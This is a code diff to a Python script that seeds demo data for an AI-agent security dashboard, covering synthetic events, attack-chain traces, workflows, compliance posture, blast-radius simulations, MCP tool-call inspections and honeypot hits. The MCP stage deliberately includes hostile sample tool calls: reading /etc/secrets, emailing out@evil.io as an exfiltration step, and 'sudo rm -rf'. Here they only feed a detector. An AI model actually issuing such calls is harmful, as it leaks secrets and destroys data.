@@ -66,6 +66,14 @@ import uuid
 from datetime import datetime, timedelta, timezone
 from typing import Any
 
+def _seed_warn(msg: str, *args: Any) -> None:
+    """Surface seed-stage warnings to stderr regardless of logging config."""
+    try:
+        formatted = msg % args if args else msg
+    except Exception:
+        formatted = f"{msg} {args}"
+    print(f"  ! {formatted}", file=sys.stderr)
+
 
 # ── Paths ─────────────────────────────────────────────────────────────────────
 
@@ -326,18 +334,24 @@ def seed_agents_and_history(
         agent_count = 0
         event_count = 0
         agent_labels: list[str] = []
+        # Sample of events from EACH archetype that will additionally be
+        # ingested through trust_graph + intent_correlation so the dashboard
+        # has populated graph nodes/edges + a baseline of detection state.
+        # We don't run downstream on all 71k events (that's the original
+        # bottleneck) — a representative sample produces a realistic graph.
+        downstream_sample: list[dict] = []
         for arch in archetypes:
+            arch_events: list[dict] = []
             for n in range(1, arch["count"] + 1):
                 label = _agent_label(arch, n)
                 agent_labels.append(label)
                 agent_count += 1
-                # Generate ~mean_actions_per_day events across the window.
                 total_events = int(arch["mean_actions_per_day"] * days_back * random.uniform(0.6, 1.1))
                 for _ in range(total_events):
                     days_ago = random.uniform(0.1, days_back)
                     geo = _pick_geo(geo_samples, arch["geo_category_weights"])
                     technique = random.choice(techniques)
-                    event = _make_uis_event(
+                    arch_events.append(_make_uis_event(
                         tenant=tenant,
                         agent_label=label,
                         archetype=arch,
@@ -345,10 +359,34 @@ def seed_agents_and_history(
                         when=_backdated(days_ago, jitter_minutes=120),
                         mitre_id=technique["id"],
                         outcome="success",
-                    )
-                    if not dry_run:
-                        uis_store.insert_event(tenant, event)
-                    event_count += 1
+                    ))
+            if not dry_run and arch_events:
+                # Bulk insert is fast (single transaction).  Sample 4 events
+                # from this archetype for the downstream pipeline so the
+                # trust_graph builds a realistic shape.
+                uis_store.bulk_insert_events(
+                    tenant, arch_events, skip_downstream=True,
+                )
+                downstream_sample.extend(random.sample(
+                    arch_events, k=min(4, len(arch_events))
+                ))
+            event_count += len(arch_events)
+
+        # Run trust_graph + intent_correlation against the sample so the
+        # dashboard has populated graph nodes/edges and detection state.
+        if not dry_run and downstream_sample:
+            from modules.identity import intent_correlation as _ic, trust_graph as _tg
+            for event in downstream_sample:
+                try:
+                    anomalies = _tg.ingest_uis_event(tenant, event)
+                    for a in anomalies:
+                        _tg.store_anomaly(a)
+                except Exception:
+                    pass
+                try:
+                    _ic.correlate_event(tenant, event)
+                except Exception:
+                    pass
         return agent_count, event_count, agent_labels
 
     acme_archetypes = archetypes_doc["archetypes"]
@@ -528,6 +566,7 @@ def seed_agents_and_history(
     _print_section("Stage 6 — Historical attack chain traces")
 
     chain_traces = 0
+    chain_events: list[dict] = []
     for chain in chains:
         # Plant one trace per chain template.  Spread events across the
         # chain's ``spans_minutes`` window, backdated 7-21 days ago so they
@@ -540,7 +579,7 @@ def seed_agents_and_history(
                     technique_id = stage.get("mitre", "T1078")
                     label = random.choice(acme_labels)
                     geo = random.choice(geo_samples)
-                    event = _make_uis_event(
+                    chain_events.append(_make_uis_event(
                         tenant=ACME,
                         agent_label=label,
                         archetype=acme_archetypes[0],
@@ -549,15 +588,214 @@ def seed_agents_and_history(
                         mitre_id=technique_id,
                         outcome=stage.get("outcome", "success"),
                         auth_method_override=stage.get("auth_method"),
-                    )
-                    try:
-                        uis_store.insert_event(ACME, event)
-                    except Exception:
-                        # Some malformed-by-design events are expected here.
-                        pass
+                    ))
                 chain_traces += 1
+    if not dry_run and chain_events:
+        # Bulk insert for the storage write...
+        uis_store.bulk_insert_events(ACME, chain_events, skip_downstream=True)
+        # ...then run downstream for every chain event because these are
+        # the anomalies the dashboard pitches against — they MUST appear
+        # in tg_anomalies + intent_matches or the demo arc widgets read empty.
+        from modules.identity import intent_correlation as _ic, trust_graph as _tg
+        for event in chain_events:
+            try:
+                anomalies = _tg.ingest_uis_event(ACME, event)
+                for a in anomalies:
+                    _tg.store_anomaly(a)
+            except Exception:
+                pass
+            try:
+                _ic.correlate_event(ACME, event)
+            except Exception:
+                pass
     summary["attack_chain_traces"] = chain_traces
     _print_step(f"{chain_traces} attack-chain trace events planted across {len(chains)} chains")
+
+    # ── 7. Industry tag + workflow attestations + compliance posture ──────────
+    _print_section("Stage 7 — Industry tag + workflows + compliance posture")
+    workflows_seeded = 0
+    posture_seeded = 0
+    if not dry_run:
+        # Industry tag — unblocks the Flywheel Digest widget.
+        try:
+            from modules.product import threat_sharing_flywheel as _tsf
+            _tsf.init_db()
+            _tsf.set_tenant_industry(ACME, "finance")
+            summary["industry_tag"] = "finance"
+        except Exception as exc:
+            _seed_warn("industry tag seed failed: %s", exc)
+
+        # Workflow attestations — give the dashboard's Workflows widget content.
+        try:
+            from modules.identity import workflow_attestation as _wa
+            _wa.init_db()
+            sample_workflows = [
+                ("invoice-approval-pipeline",
+                 "Finance approval chain — bot → analyst → CFO sign-off",
+                 [
+                    {"actor": "finance-bot-01", "action": "extract_invoice"},
+                    {"actor": "analyst-bot-03", "action": "validate_amount"},
+                    {"actor": "approver-bot-02", "action": "sign_payment"},
+                 ]),
+                ("data-export-pipeline",
+                 "Customer data export with redaction + audit log",
+                 [
+                    {"actor": "data-loader-02", "action": "fetch_records"},
+                    {"actor": "redaction-bot-01", "action": "redact_pii"},
+                    {"actor": "data-loader-02", "action": "write_export"},
+                 ]),
+                ("incident-response-runbook",
+                 "Auto-triage of policy_guard violations",
+                 [
+                    {"actor": "ops-runner-01", "action": "fetch_violation"},
+                    {"actor": "ops-runner-01", "action": "snapshot_state"},
+                    {"actor": "policy_advisor", "action": "propose_amendment"},
+                 ]),
+                ("kyc-onboarding-pipeline",
+                 "New customer KYC pipeline",
+                 [
+                    {"actor": "kyc-bot-01", "action": "extract_identity"},
+                    {"actor": "kyc-bot-01", "action": "verify_documents"},
+                    {"actor": "compliance-bot-01", "action": "approve_record"},
+                 ]),
+            ]
+            for name, desc, hops in sample_workflows:
+                try:
+                    _wa.register_workflow(
+                        tenant_id=ACME, name=name, hops=hops,
+                        description=desc, created_by="demo-seeder",
+                    )
+                    workflows_seeded += 1
+                except Exception as exc:
+                    _seed_warn("register_workflow %s failed: %s", name, exc)
+        except Exception as exc:
+            _seed_warn("workflow seed failed: %s", exc)
+
+        # Compliance posture — generate one statement per supported framework.
+        # Ensure dependent modules used by collectors have their tables.
+        for _mod_name in (
+            "modules.identity.delegation_receipt",
+            "modules.identity.agent_lifecycle",
+            "modules.identity.cert_dashboard",
+        ):
+            try:
+                __import__(_mod_name, fromlist=["init_db"]).init_db()
+            except Exception as exc:
+                _seed_warn("init %s failed: %s", _mod_name, exc)
+        try:
+            from modules.identity import compliance_posture as _cp
+            _cp.init_db()
+            for framework in ("soc2", "iso42001", "nist_ai_rmf", "eu_ai_act"):
+                try:
+                    _cp.generate_posture_statement(ACME, framework)
+                    posture_seeded += 1
+                except Exception as exc:
+                    _seed_warn("posture %s failed: %s", framework, exc)
+        except Exception as exc:
+            _seed_warn("posture seed failed: %s", exc)
+
+    summary["workflows_seeded"] = workflows_seeded
+    summary["posture_statements_seeded"] = posture_seeded
+    _print_step(f"industry tag set + {workflows_seeded} workflows registered + {posture_seeded} posture statements")
+
+    # ── 8. Blast radius simulation history ────────────────────────────────────
+    _print_section("Stage 8 — Blast radius simulation history")
+    blast_runs = 0
+    if not dry_run:
+        try:
+            from modules.identity import blast_radius as _br
+            # Run 8 simulations against varied agents — populates the
+            # Simulation History widget + gives the operator drill-in targets.
+            sample_agents = random.sample(acme_labels, k=min(8, len(acme_labels)))
+            for label in sample_agents:
+                try:
+                    result = _br.simulate_blast_radius(
+                        tenant_id=ACME, agent_label=label, max_hops=4,
+                    )
+                    _br.store_simulation(result)
+                    blast_runs += 1
+                except Exception as exc:
+                    _seed_warn("blast_radius simulate %s failed: %s", label, exc)
+        except Exception as exc:
+            _seed_warn("blast radius seed failed: %s", exc)
+    summary["blast_radius_simulations"] = blast_runs
+    _print_step(f"{blast_runs} blast radius simulations stored")
+
+    # ── 9. MCP inspection history ─────────────────────────────────────────────
+    _print_section("Stage 9 — MCP inspection history")
+    mcp_runs = 0
+    if not dry_run:
+        try:
+            from modules.identity import mcp_inspector as _mcp
+            # Mix of clean calls and intentional violations so the dashboard
+            # has both the volume widget and the violations table populated.
+            mcp_scenarios = [
+                # Clean reads
+                ("read_file",   {"path": "/etc/safe.json"}, "finance-bot-01"),
+                ("read_file",   {"path": "/var/log/app.log"}, "ops-runner-01"),
+                # Forbidden param — fires a violation
+                ("read_file",   {"write": "evil"}, "drifty-agent-01"),
+                # MCP chain pattern read → exfil
+                ("read_file",   {"path": "/etc/secrets"}, "drifty-agent-02"),
+                ("send_email",  {"to": "out@evil.io", "subject": "x", "body": "x"}, "drifty-agent-02"),
+                # Privilege escalation
+                ("execute_command", {"command": "sudo rm -rf"}, "eng-asst-04"),
+            ]
+            shared_session = f"sess-seed-{uuid.uuid4().hex[:8]}"
+            for tool, params, agent in mcp_scenarios:
+                try:
+                    _mcp.inspect_call(
+                        tenant_id=ACME, session_id=shared_session,
+                        tool_name=tool, params=params, agent_id=agent,
+                    )
+                    mcp_runs += 1
+                except Exception as exc:
+                    _seed_warn("mcp inspect_call %s failed: %s", tool, exc)
+        except Exception as exc:
+            _seed_warn("mcp seed failed: %s", exc)
+    summary["mcp_inspections"] = mcp_runs
+    _print_step(f"{mcp_runs} MCP inspections (mix of clean + violation + chain)")
+
+    # ── 10. Honeypot trip history ─────────────────────────────────────────────
+    _print_section("Stage 10 — Honeypot trip history")
+    extra_hits = 0
+    if not dry_run:
+        try:
+            from modules.identity import honeypot_mesh as _hm
+            decoys = _hm.get_decoy_inventory(tenant_id=ACME)
+            # Plant 4 hits across 3 different decoys so the widget shows
+            # a mix of unacknowledged + multi-decoy activity.
+            target_decoys = decoys[:3] if len(decoys) >= 3 else decoys
+            user_agents = [
+                "curl/7.81", "python-requests/2.31",
+                "Mozilla/5.0 (compatible)",
+            ]
+            for decoy in target_decoys:
+                for _ in range(2):
+                    try:
+                        meta = decoy.get("metadata") or {}
+                        request_path = meta.get(
+                            "trigger_endpoint") or "/decoy/unknown"
+                        hit = _hm.record_decoy_hit(
+                            decoy_id=decoy["decoy_id"],
+                            tenant_id=ACME,
+                            source_ip=random.choice(geo_samples)["ip"],
+                            user_agent=random.choice(user_agents),
+                            request_path=request_path,
+                            request_meta={
+                                "method": "GET",
+                                "agent_id": random.choice(acme_labels),
+                                "demo_seeded": True,
+                            },
+                        )
+                        if hit is not None:
+                            extra_hits += 1
+                    except Exception as exc:
+                        _seed_warn("record_decoy_hit failed: %s", exc)
+        except Exception as exc:
+            _seed_warn("honeypot hit seed failed: %s", exc)
+    summary["honeypot_hits_seeded"] = extra_hits
+    _print_step(f"{extra_hits} additional honeypot trips recorded across multiple decoys")
 
     if not dry_run:
         conn.close()
@@ -571,8 +809,14 @@ def seed_agents_and_history(
     _print_step(f"policy_violations: {summary['policy_violations']}")
     _print_step(f"policy_suggestions: {summary['policy_suggestions']}")
     _print_step(f"honeytokens:      {summary['honeypot_decoys']}")
+    _print_step(f"honeypot_hits_seeded: {summary.get('honeypot_hits_seeded', 0)}")
     _print_step(f"federation_trusts: {summary['federation_trusts']}")
     _print_step(f"attack_chain_traces: {summary['attack_chain_traces']}")
+    _print_step(f"workflows_seeded: {summary.get('workflows_seeded', 0)}")
+    _print_step(f"posture_statements_seeded: {summary.get('posture_statements_seeded', 0)}")
+    _print_step(f"blast_radius_simulations: {summary.get('blast_radius_simulations', 0)}")
+    _print_step(f"mcp_inspections: {summary.get('mcp_inspections', 0)}")
+    _print_step(f"industry_tag: {summary.get('industry_tag', '(unset)')}")
     if dry_run:
         print("\n  (dry-run — nothing was written)\n")
     else:
